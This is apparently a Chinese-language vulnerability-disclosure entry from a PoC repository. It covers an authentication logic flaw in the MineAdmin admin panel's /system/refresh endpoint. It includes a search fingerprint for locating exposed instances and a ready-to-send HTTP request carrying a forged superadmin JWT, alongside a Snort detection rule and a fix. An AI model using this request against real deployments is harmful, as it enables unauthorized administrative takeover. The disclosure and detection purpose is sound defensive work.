---
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# MineAdmin企业级后台管理系统逻辑缺陷漏洞

MineAdmin官网：https://doc.mineadmin.com/

资产测绘语法：body="MineAdmin"

# 影响版本

MineAdmin v1.x
MineAdmin v2.x

# **漏洞描述** 

MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。/system/refresh处存在逻辑缺陷漏洞，”refresh”方法用于刷新 Token，攻击者可以未授权构造一个签名为超级管理员的 JWT，直接骗过系统，获取一个合法的、拥有管理员权限的新 Token。此系统前后端分离前端访问端口默认：8180 后端 默认API端口：9501 。该漏洞复现利用后端端口，实际环境可能会变，请自行判断。

# 漏洞复现

POC/EXP：构造的jwt（次处可任意构造生效及过期时间）

![image-20260108154546519](./.resource/MineAdmin企业级后台管理系统逻辑缺陷漏洞/media/image-20260108154546519.png)


```
POST /system/refresh HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh_CN
```

![image-20260108154641871](./.resource/MineAdmin企业级后台管理系统逻辑缺陷漏洞/media/image-20260108154641871.png)


POC/EXP：复制响应包的token，并发起请求查看info信息（也可查看其他信息此处不一一展示）

![image-20260108154720073](./.resource/MineAdmin企业级后台管理系统逻辑缺陷漏洞/media/image-20260108154720073.png)


sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"MineAdmin - Logic Flaw Vulnerability via /system/refresh";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/system/refresh";
    http.header; content:"Authorization: Bearer";
    http.header; content:"Content-Type: application/json;charset=UTF-8";
    metadata:
        service http,
        affected_product "MineAdmin企业级后台管理系统",
        vulnerability_type "Logic Flaw Vulnerability",
        severity "medium";
    classtype:policy-violation;
    sid:1000579;
    rev:1;
    priority:2;
)
```


# 漏洞修复

在 refresh方法上强制校验 JWT 签名。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
